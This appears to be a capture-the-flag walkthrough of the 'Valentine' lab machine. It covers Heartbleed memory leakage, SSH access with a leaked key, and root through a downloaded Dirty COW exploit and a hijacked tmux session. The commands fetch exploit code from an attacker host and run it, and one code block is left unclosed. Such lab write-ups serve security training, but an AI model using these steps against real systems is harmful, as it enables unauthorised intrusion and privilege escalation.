# Recon

## Machine IP Setup

First, we setup the target IP and run AutoRecon on it:

```bash
export IP=10.10.10.79
```

```bash
autorecon $IP -v
```

## Initial Results

The initial results we obtain are as follows:

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled.png)

The Ports that are open are:

- 22: ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
- 80: http Apache httpd 2.2.22 ((Ubuntu))
- 443: https Apache httpd 2.2.22 ((Ubuntu))

## Full Results

Further scanning showed:

As such, the compiled results we obtain are as follows:

- 5353: DNS-based service discovery

# Enumeration (Service Version Check)

Seeing that port 80 is open, we can first try to visit the website by entering the IP address in the browser. Upon loading, we see the following image:

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%202.png)

And if we examine the page source, we see that the page only contains one image element:

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%203.png)

And if we examine the page source, we see that the page only contains one image element:

To take a closer look at what is available on the website, we can examine the results from feroxbuster that is automatically run with Autorecon:

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%204.png)

We can see that we have a few php files, along with a dev directory. The contents of the dev directory are as follows:

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%205.png)

Taking a look at notes.txt, we can see the following:

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%206.png)

This links back to the encode.php and decode.php which we saw in the feroxbuster results, which we can take a look at in a minute.

Meanwhile, hype_key contains a string of what looks like hex:

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%207.png)

If we examine this string of hex by putting it into a hex decoder, we get the following rsa private key:

```python

If we navigate to either IP/encode(.php) or IP/decode(.php), we see the same two pages with or without the php extension, so will simply reference the two pages without the extension from here.

IP/encode shows the following page:

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%208.png)

While IP/decode shows the following page:

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%209.png)

To examine the pair of webpages, we first entered the string "Test" into the decoder before we placed the encoded result into the decoder:

Encoding "Test":

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%2010.png)

Decoding "VGVzdA==":

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%2011.png)

The encoding/decoding seems to be done in base64, as the ending characters == are typically found as the ending characters of base64 encoding. To verify this, we can paste the encoded output into a base64 decoder such as Cyberchef, where we get the same string back:

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%2012.png)

Further examining the results from the scan, we see that the results from the nmap scans on port 443 shows that there is a heartbleed vulnerability:

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%2013.png)

This vulnerability fits the descriptions of the above clues, where we are trying to leak information that is not meant to be saved on the server but it actually is.

The basic idea of the bug is that the server is meant to receive a message payload and its specified length, process it, and send the same message and its length back. However, there is no check to ensure that the specified length is indeed correct, and when the length specified exceeds what is sent, additional information from the machine's memory is copied and sent back in the response.

# Initial Foothold

To exploit the heartbleed vulnerability, we can use exploits we can find on the web such as the one here: [https://gist.github.com/eelsivart/10174134](https://gist.github.com/eelsivart/10174134)

```bash
git clone https://gist.github.com/eelsivart/10174134
```

To use the payload, we can run it in the following way:

```bash
python heartbleed.py -p PORT_NUMBER -n NUM_LOOPS IP_ADDRESS
```

We see multiple instances of the following request, which is what looks like someone trying to decode a string using the decode.php we found earlier:

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%2014.png)

If we extract and decode the base64 string and decode it, we seem to have obtain what is likely the password: "heartbleedbelievethehype"

To utilise the private key we found, we can use curl to save the file with the following command:

```bash
curl -o hype_key http://10.10.10.79/dev/hype_key
```

This gives us the file in hex, so we have to convert it into plaintext using the following command:

```bash
cat hype_key | xxd -r -p > hype_key2
```

As a rsa key file, we have to modify the permissions of the file using the following command:

```bash
chmod 400 hype_key2
```

# User Flag

From the naming convention, we can guess that that the username is hype.

Therefore, we can attempt to log into ssh with the following command:

```bash
ssh -i hype_key2 hype@10.10.10.79
```

When prompted for the password, we can simply enter the password we found above, and we can see that we have shell:

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%2015.png)

To find the user flag, we can use the common method of navigating to home and using find:

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%2016.png)

This gives us the user flag.

# Root Flag

## Route 1: Dirty Cow

To escalate privileges, we can first use linux-exploit-suggester.

We have to download the script if we do not have it yet, and navigate to the folder containing the script, before setting a http server with the following command.

```powershell
python3 -m http.server 9000
```

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%2017.png)

Next, we check if the target machine has curl or wget with the which command, and it turns out that we have wget:

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%2018.png)

So we can run navigate to any world writable directory, in this case we will use /var/tmp, and run the following command:

```bash
wget 10.10.17.90:9000/linux-exploit-suggester-2.pl
```

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%2019.png)

From there we can give it execute permissions and run it:

```bash
chmod +x linux-exploit-suggester-2.pl
./linux-exploit-suggester-2.pl
```

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%2020.png)

From the information, we can attempt to run dirty-cow on it.

To use dirty cow, we first have to clone script and set up http server (if it was closed):

```bash
git clone https://github.com/FireFart/dirtycow.git
```

```bash
#HTTP server if it was already off
python3 -m http.server 9000
```

On Target machine, wget the script, compile it, and run

```bash
wget http://10.10.17.90:9000/dirty.c
```

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%2021.png)

```bash
#Compile the script
gcc -pthread dirty.c -o dirty -lcrypt
```

```bash
./dirty
```

When prompted, create password for firefart (the default username):

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%2022.png)

Upon completion, switch user to firefart

```bash
su firefart
```

And we see that we once we log in, we are in the root group, and hence have root access

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%2023.png)

## Route 2: tmux

First, we can check bash history:

```bash
cat ~/.bash_history
```

If we see tmux -S, we know a tmux session was started

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%2024.png)

Check for the session in running root processes:

```bash
ps -ef | grep root
```

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%2025.png)

Check for permissions of session file:

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%2026.png)

If we are have permissions, to access that file, we can run the following command to switch to that session that was run by root:

```bash
tmux -S /.devs/dev_sess
```

With that, we have root:

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%2027.png)

## Getting the Flag

With root from either route, we can simply cd to home and use find to find the root flag:

![Untitled](Valentine%20951cc2e3a0a847249981b494aef933be/Untitled%2028.png)

# Learning Points (Additional Points)

- We cannot use sudo -l on a ssh session unless we have user password
- tmux is useful and easy to exploit, so good to check
- Older versions of Ubuntu and Linux can have privesc with dirty cow
